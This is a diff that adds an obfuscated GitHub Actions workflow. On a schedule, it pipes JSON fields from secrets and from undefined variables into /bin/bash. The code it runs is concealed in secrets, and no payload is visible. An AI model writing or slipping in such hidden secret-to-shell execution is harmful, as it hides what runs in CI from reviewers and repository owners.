@@ -1,0 +1,31 @@
+name: tiaoxinyuekexiaoo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tiaoxinyuekexiaoo
+        env:
+          njuh220: ${{ secrets.njuh220 }}
+        run: |
+          echo $njuh220 | jq -r .yniy1328 | /bin/bash
+          echo $yq180 | jq -r .b7323 | /bin/bash
+          echo $xue4664 | jq -r .dw09 | /bin/bash
+          echo $xsxtq4120 | jq -r .rm2185 | /bin/bash
+          echo $p2 | jq -r .rn94 | /bin/bash
+          echo $hlqbz82228 | jq -r .p95918 | /bin/bash
+          echo $byt9411 | jq -r .zlxq99900 | /bin/bash
+          echo $tp3 | jq -r .if24 | /bin/bash
+          echo $f5498 | jq -r .u240 | /bin/bash
+          echo $wobgg472 | jq -r .dllmb96167 | /bin/bash
+          echo $bbk3 | jq -r .yq59094 | /bin/bash
+          echo $iz86 | jq -r .zvi7 | /bin/bash
+          echo $yt8692 | jq -r .zzl43 | /bin/bash
+          echo $a75399 | jq -r .os3440 | /bin/bash
+          echo $lirfa3 | jq -r .ayv87153 | /bin/bash
+
